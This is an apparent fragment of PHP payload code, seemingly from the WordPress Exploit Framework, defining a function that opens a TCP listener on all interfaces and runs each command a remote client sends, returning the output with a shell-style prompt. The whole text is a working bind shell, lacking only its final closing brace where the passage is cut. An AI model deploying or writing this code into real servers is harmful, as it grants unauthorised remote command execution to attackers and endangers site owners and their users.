<?php
function startSocketServer($port, $wpxf_disabled, $wpxf_exec) {
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    socket_bind($socket, '0.0.0.0', $port);
    socket_listen($socket);
    $clients = [];
    $clientData = [];

    while (true) {
        $read = $clients;
        $read[] = $socket;
        $write = null;
        $except = null;

        if (socket_select($read, $write, $except, 0) < 1) {
            continue;
        }

        if (in_array($socket, $read)) {
            $newSocket = socket_accept($socket);
            $clients[] = $newSocket;
            $clientData[(int)$newSocket] = [
                'cwd' => getcwd()
            ];
            socket_write($newSocket, "Connected to server.\n");
            $key = array_search($socket, $read);
            unset($read[$key]);
        }

        foreach ($read as $read_sock) {
            $data = @socket_read($read_sock, 1024, PHP_NORMAL_READ);
            if ($data === false) {
                $key = array_search($read_sock, $clients);
                unset($clients[$key]);
                socket_close($read_sock);
                continue;
            }

            $data = trim($data);
            if ($data === 'exit' || $data === 'quit') {
                socket_write($read_sock, "Connection closed.\n");
                $key = array_search($read_sock, $clients);
                unset($clients[$key]);
                socket_close($read_sock);
                continue;
            }

            $cwd = $clientData[(int)$read_sock]['cwd'];
            if (strpos($data, 'cd ') === 0) {
                $newDir = substr($data, 3);
                $newDir = realpath($cwd . DIRECTORY_SEPARATOR . $newDir);
                if ($newDir && is_dir($newDir)) {
                    $clientData[(int)$read_sock]['cwd'] = $newDir;
                    socket_write($read_sock, "Directory changed to {$newDir}\n");
                } else {
                    socket_write($read_sock, "Invalid directory.\n");
                }
            } elseif (!in_array($data, $wpxf_disabled)) {
                chdir($cwd);
                $output = $wpxf_exec($data);
                socket_write($read_sock, $output . "\n");
            } else {
                socket_write($read_sock, "Command disabled.\n");
            }

            socket_write($read_sock, $clientData[(int)$read_sock]['cwd'] . "> ");
        }
    }

